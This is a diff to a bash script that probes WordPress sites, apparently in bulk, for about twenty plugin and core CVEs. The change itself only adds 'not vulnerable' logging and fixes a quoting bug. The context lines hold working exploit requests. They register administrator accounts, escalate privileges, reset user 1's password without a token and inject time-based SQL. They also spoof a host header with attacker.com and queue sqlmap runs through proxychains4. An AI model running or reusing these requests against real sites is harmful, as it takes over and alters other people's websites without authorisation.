-    elif [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "invalid_nonce"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "no nonce error (200)" "auth-bypass"; fi
+    elif [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "invalid_nonce"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "no nonce error (200)" "auth-bypass"
+    else log_safe "$DOMAIN" "$CVE" "nonce enforced"; fi
 }
 _check_CVE_2023_3460() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-3460"
@@ -352,7 +353,8 @@ _check_CVE_2023_3460() {
     local RAND="p$(date +%s%N|tail -c 6)"
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=um_submit_form&nonce=x&form_id=1&um-role=administrator&submitted[user_login]=${RAND}&submitted[user_email]=${RAND}@p.invalid&submitted[user_password]=Probe1234!&submitted[confirm_user_password]=Probe1234!")
     local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
-    if echo "$BODY"|grep -qiE '"administrator"|redirect'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin registered" "privesc"; fi
+    if echo "$BODY"|grep -qiE '"administrator"|redirect'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin registered" "privesc"
+    else log_safe "$DOMAIN" "$CVE" "registration blocked"; fi
 }
 _check_CVE_2024_10924() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-10924"
@@ -360,7 +362,7 @@ _check_CVE_2024_10924() {
     if ! plugin_check "$BASE_URL" "really-simple-ssl"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/reallysimplessl/v1/two_fa/skip_onboarding" POST '{"user_id":1,"login_nonce":"probe"}' application/json)
     local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
-    [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "rest_forbidden|invalid" && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "2FA bypass (200)" "auth-bypass"
+    if [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "rest_forbidden|invalid"; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "2FA bypass (200)" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "endpoint protected"; fi
 }
 _check_CVE_2023_28121() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-28121"
@@ -368,21 +370,21 @@ _check_CVE_2023_28121() {
     if ! plugin_check "$BASE_URL" "woocommerce-payments"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" "${BASE_URL}/wp-json/wp/v2/users/1" 2>/dev/null||true)
     local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
-    [ "$STATUS" = "200" ] && echo "$BODY"|grep -q '"email"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin email via header spoof" "auth-bypass"
+    if [ "$STATUS" = "200" ] && echo "$BODY"|grep -q '"email"'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin email via header spoof" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "header ignored or email hidden"; fi
 }
 _check_CVE_2024_28000() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-28000"
     echo -e "\n${YELLOW}[${CVE}] LiteSpeed Cache — weak hash${NC}"
     if ! plugin_check "$BASE_URL" "litespeed-cache"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local VER; VER=$(curl -sk -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null|grep -oP "Stable tag:\s*\K[\d.]+" || echo "")
-    if [ -n "$VER" ]; then local MAJ=${VER%%.*}; if [ "$MAJ" -lt 6 ] || [[ "$VER" =~ ^6\.[0-3]\. ]]; then log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "v${VER} <= 6.3.0.1" "privesc"; fi; fi
+    if [ -n "$VER" ]; then local MAJ=${VER%%.*}; if [ "$MAJ" -lt 6 ] || [[ "$VER" =~ ^6\.[0-3]\. ]]; then log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "v${VER} <= 6.3.0.1" "privesc"; else log_safe "$DOMAIN" "$CVE" "v${VER} not vulnerable"; fi; else log_safe "$DOMAIN" "$CVE" "version undetectable"; fi
 }
 _check_CVE_2020_8772() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2020-8772"
     echo -e "\n${YELLOW}[${CVE}] InfiniteWP — base64 auth bypass${NC}"
     if ! plugin_check "$BASE_URL" "iwp-client"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/" POST 'iwp_action=add_site&serialized_option=eyJpd3BfYWN0aW9uIjoiYWRkX3NpdGUiLCJwYXJhbXMiOnsidXNlcm5hbWUiOiJhZG1pbiJ9fQ==')
-    echo "$RESP"|head -n -1|grep -qiE '"success".*true|logged_in' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "bypass" "auth-bypass"
+    if echo "$RESP"|head -n -1|grep -qiE '"success".*true|logged_in'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "bypass" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2023_3076() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-3076"
@@ -390,14 +392,14 @@ _check_CVE_2023_3076() {
     if ! plugin_check "$BASE_URL" "mstore-api"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local R="p$(date +%s%N|tail -c 6)"
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/mstore-api/v3/customers" POST "{\"email\":\"${R}@p.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\"}" application/json)
-    echo "$RESP"|head -n -1|grep -qi '"administrator"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin created" "privesc"
+    if echo "$RESP"|head -n -1|grep -qi '"administrator"'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin created" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2023_6009() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-6009"
     echo -e "\n${YELLOW}[${CVE}] UserPro — profile update privesc${NC}"
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_save_profile&user_id=1&wp_capabilities[administrator]=1&nonce=probe')
-    echo "$RESP"|head -n -1|grep -qiE '"success".*true|saved' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update no auth" "privesc"
+    if echo "$RESP"|head -n -1|grep -qiE '"success".*true|saved'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update no auth" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2024_27956() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-27956"
@@ -405,7 +407,8 @@ _check_CVE_2024_27956() {
     if ! plugin_check "$BASE_URL" "wp-automatic"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local DUR; DUR=$(time_check "${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php" POST 'q=SELECT+IF(1=1,SLEEP(6),0)')
     if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "SQLi sleep=${DUR}s" "sqli"
-        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php' --data='q=1' -p q --technique=T --dbms=MySQL --batch"; fi
+        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php' --data='q=1' -p q --technique=T --dbms=MySQL --batch"
+    else log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"; fi
 }
 _check_CVE_2024_1071() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-1071"
@@ -413,7 +416,8 @@ _check_CVE_2024_1071() {
     if ! plugin_check "$BASE_URL" "ultimate-member"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local DUR; DUR=$(time_check "${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members" POST 'nonce=probe&directory_id=1&sorting=user_login%2CSLEEP(6)')
     if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "sorting SQLi sleep=${DUR}s" "sqli"
-        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members' --data='nonce=x&directory_id=1&sorting=user_login' -p sorting --technique=T --dbms=MySQL --batch"; fi
+        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members' --data='nonce=x&directory_id=1&sorting=user_login' -p sorting --technique=T --dbms=MySQL --batch"
+    else log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"; fi
 }
 _check_CVE_2024_1698() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-1698"
@@ -421,7 +425,8 @@ _check_CVE_2024_1698() {
     if ! plugin_check "$BASE_URL" "notificationx"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local DUR; DUR=$(time_check "${BASE_URL}/wp-json/notificationx/v1/analytics" POST '{"nx_id":"1","type":"clicks`=1 and 1=sleep(6)-- -"}' 10)
     if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "type SQLi sleep=${DUR}s" "sqli"
-        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-json/notificationx/v1/analytics' --data='{\"nx_id\":\"1\",\"type\":\"1\"}' -p type --technique=T --dbms=MySQL --batch"; fi
+        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-json/notificationx/v1/analytics' --data='{\"nx_id\":\"1\",\"type\":\"1\"}' -p type --technique=T --dbms=MySQL --batch"
+    else log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"; fi
 }
 _check_CVE_2025_8489() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2025-8489"
@@ -429,7 +434,7 @@ _check_CVE_2025_8489() {
     if ! plugin_check "$BASE_URL" "king-addons"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local R="p$(date +%s%N|tail -c 6)"
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/king-addons/v1/register" POST "{\"username\":\"${R}\",\"email\":\"${R}@p.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\"}" application/json)
-    echo "$RESP"|head -n -1|grep -qi '"administrator"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin via REST" "privesc"
+    if echo "$RESP"|head -n -1|grep -qi '"administrator"'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin via REST" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2026_1492() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2026-1492"
@@ -437,13 +442,13 @@ _check_CVE_2026_1492() {
     if ! plugin_check "$BASE_URL" "user-registration"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local R="p$(date +%s%N|tail -c 6)"
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=user_registration_user_register&nonce=probe&ur_front_username=${R}&ur_front_email=${R}@p.invalid&ur_front_password=Probe1234!&role=administrator&form_id=0")
-    echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"
+    if echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2017_8295() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2017-8295"
     echo -e "\n${YELLOW}[${CVE}] WP Core — Host Header injection${NC}"
     local RESP; RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "X-Forwarded-Host: attacker.com" --data "user_login=admin&redirect_to=&wp-submit=Get+New+Password" "${BASE_URL}/wp-login.php?action=lostpassword" 2>/dev/null||true)
-    echo "$RESP"|head -n -1|grep -qiE "check.your.email|link has been sent" && log_vuln "$DOMAIN" "$CVE" "LIKELY" "reset email with X-Forwarded-Host" "auth-bypass"
+    if echo "$RESP"|head -n -1|grep -qiE "check.your.email|link has been sent"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "reset email with X-Forwarded-Host" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "Host header ignored"; fi
 }
 _check_CVE_2024_9863() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-9863"
@@ -451,14 +456,14 @@ _check_CVE_2024_9863() {
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local R="p$(date +%s%N|tail -c 6)"
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=userpro_ajax_register&nonce=probe&user_login=${R}&user_email=${R}@p.invalid&user_pass=Probe1234!&role=administrator")
-    echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"
+    if echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2024_35700() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-35700"
     echo -e "\n${YELLOW}[${CVE}] UserPro — password reset without token${NC}"
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_change_password&user_id=1&new_password=Probe1234!&confirm_password=Probe1234!&key=')
-    echo "$RESP"|head -n -1|grep -qiE '"success".*true|password_changed' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "password reset no token" "auth-bypass"
+    if echo "$RESP"|head -n -1|grep -qiE '"success".*true|password_changed'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "password reset no token" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 _check_CVE_2023_2449() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2449"
@@ -466,14 +471,14 @@ _check_CVE_2023_2449() {
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/?up_activate=1&key=probe&user_id=1")
     local STATUS=$(echo "$RESP"|tail -1)
-    [ "$STATUS" = "200" ] && ! echo "$RESP"|head -n -1|grep -qi "Invalid|expired|404" && log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible (200)" "auth-bypass"
+    if [ "$STATUS" = "200" ] && ! echo "$RESP"|head -n -1|grep -qi "Invalid|expired|404"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible (200)" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "activation blocked"; fi
 }
 _check_CVE_2023_2437() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2437"
     echo -e "\n${YELLOW}[${CVE}] UserPro — Facebook login bypass${NC}"
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_facebook_login&fb_access_token=probe&fb_user_id=1&fb_user_email=admin@probe.invalid')
-    echo "$RESP"|head -n -1|grep -qiE '"loggedin".*true' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Facebook token not validated" "auth-bypass"
+    if echo "$RESP"|head -n -1|grep -qiE '"loggedin".*true'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Facebook token not validated" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
 }
 
 validate_domain() {
@@ -910,7 +915,7 @@ if [ -f "$INPUT" ]; then
             [ -z "$TMPL_ID" ]||[ -z "$DOMAIN" ] && continue
             PAIR="${DOMAIN}|${TMPL_ID}"
             echo "$SEEN"|grep -qF "$PAIR" && continue
-            SEEN="${SEEN}${PAIR}$'\n'"
+            SEEN="${SEEN}${PAIR}"$'\n'
             validate_domain "$DOMAIN" "$TMPL_ID"
         done < "$INPUT"
     else
